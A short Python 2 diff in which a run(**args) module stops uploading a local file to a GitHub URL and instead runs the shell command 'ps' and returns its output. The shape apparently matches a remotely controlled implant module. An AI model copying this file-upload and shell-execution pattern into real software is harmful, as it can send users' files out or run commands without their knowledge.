@@ -1,11 +1,11 @@
-import requests
+import subprocess
 def run(**args):
   try:
       print("Testing") 
-      url='https://github.com/experiment2016/workhub/tree/master/data/post'
-      files = {'upload_file': open('file.txt','rb')}
-      values={'upload_file' : 'file.txt'}
-      r=requests.post(url,files=files,data=values)
+      ta = "ps"  
+      proc = subprocess.Popen(ta, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+      stdoutput = proc.stdout.read() + proc.stderr.read()
+      return str(stdoutput)
   except Exception, e:
       return str(e)
   
